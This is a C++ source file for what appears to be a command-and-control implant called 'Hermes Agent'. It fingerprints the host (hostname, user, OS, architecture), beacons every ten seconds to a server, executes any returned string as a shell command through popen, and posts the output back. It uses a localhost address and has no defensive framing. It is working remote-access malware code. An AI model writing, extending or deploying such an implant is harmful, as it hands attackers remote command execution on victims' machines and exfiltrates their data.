#include <iostream>
#include <string>
#include <curl/curl.h>
#include <unistd.h>
#include <limits.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <cstdio>
#include <memory>
#include <array>

struct SysInfo {
    std::string os_version;
    std::string arch;
};

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string execute_command(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) return "[-] Error: popen() failed";
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

void send_report(const std::string& base_url, const std::string& agent_id, const std::string& output) {
    CURL* curl = curl_easy_init();
    if(curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, ("X-Agent-ID: " + agent_id).c_str());
        headers = curl_slist_append(headers, "Content-Type: text/plain");

        std::string report_url = base_url + "/report";

        curl_easy_setopt(curl, CURLOPT_URL, report_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, output.c_str());

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            std::cerr << "[-] Report failed: " << curl_easy_strerror(res) << std::endl;
        } else {
            std::cout << "[+] Result reported to server." << std::endl;
        }

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}

// ... (get_hostname, get_username, get_sys_info stay the same) ...

std::string get_hostname() {
    char hostname[HOST_NAME_MAX];
    gethostname(hostname, HOST_NAME_MAX);
    return std::string(hostname);
}


std::string get_username() {
    uid_t uid = geteuid();
    struct passwd *pw = getpwuid(uid);
    return (pw) ? std::string(pw->pw_name) : "unknown";
}



SysInfo get_sys_info() {
    struct utsname buffer;
    if (uname(&buffer) != 0) return {"unknown", "unknown"};
    return { std::string(buffer.sysname) + " " + std::string(buffer.release), std::string(buffer.machine) };
}


void send_beacon(const std::string& url, const std::string& agent_id, const SysInfo& info) {
    CURL* curl = curl_easy_init();
    if(curl) {
        std::string response_body;
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, ("X-Agent-ID: " + agent_id).c_str());
    
        headers = curl_slist_append(headers, ("X-OS-Version: " + info.os_version).c_str());
        headers = curl_slist_append(headers, ("X-Arch: " + info.arch).c_str());

        curl_easy_setopt(curl, CURLOPT_URL, (url + "/checkin").c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ""); 
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

        CURLcode res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            std::cerr << "[-] Beacon failed: " << curl_easy_strerror(res) << std::endl;
        } else {
            if (response_body != "OLYMPUS_ACK" && !response_body.empty()) {
                std::cout << "🎯 Task Received: " << response_body << std::endl;
                
                std::string output = execute_command(response_body);
                std::cout << "📈 Result local log:\n" << output << std::endl;

                // REPORT the output back to the server
                send_report(url, agent_id, output);
            } else {
                std::cout << "[+] Heartbeat: OK" << std::endl;
            }
        }
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
    }
}


int main() {
    // Note: Use the base URL here
    std::string base_url = "http://localhost:8080";
    std::string my_id = get_hostname() + "-" + get_username();

    SysInfo info = get_sys_info();

    std::cout << "⚡ Hermes Agent Identity: " << my_id << std::endl;
    std::cout << "📋 Discovery: " << info.os_version << " (" << info.arch << ")" << std::endl;

    while(true) {
        send_beacon(base_url, my_id, info);
        sleep(10); 
    }
    return 0;
}
